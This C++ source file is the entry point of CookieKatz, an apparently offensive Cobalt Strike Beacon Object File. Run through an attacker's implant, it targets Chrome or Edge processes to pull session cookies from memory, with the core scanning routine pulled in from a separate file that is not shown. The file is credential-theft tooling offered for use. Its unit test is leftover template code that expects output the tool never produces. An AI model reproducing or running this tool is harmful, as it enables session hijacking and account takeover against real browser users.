#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include "ChromeKatz/Process.cpp"

extern "C" {
#include "beacon.h"

    DFR(MSVCRT, _stricmp);
#define _stricmp MSVCRT$_stricmp

    //This is important!
    void banner() {
        BeaconPrintf(CALLBACK_OUTPUT, " _____             _    _      _   __      _       \n");
        BeaconPrintf(CALLBACK_OUTPUT, "/  __ \\           | |  (_)    | | / /     | |      \n");
        BeaconPrintf(CALLBACK_OUTPUT, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
        BeaconPrintf(CALLBACK_OUTPUT, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
        BeaconPrintf(CALLBACK_OUTPUT, "By Meckazin                       github.com/Meckazin \n");
    };

    //Example inputs:
    //  edge:   0a000000060000002f6564676500
    //  chrome: 0c000000080000002f6368726f6d6500
    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");

        datap parser;
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome or /edge!\n");
            return;
        }

        LPCSTR targetConfig = BeaconDataExtract(&parser, NULL);
        LPCWSTR processName;
        if (_stricmp(targetConfig, "/chrome") == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Chrome\n");
            processName = L"chrome.exe";
        }
        else if (_stricmp(targetConfig, "/edge") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
            processName = L"msedge.exe";
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge or /chrome to specify target!\n");
            return;
        }

        FindAllSuitableProcesses(processName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif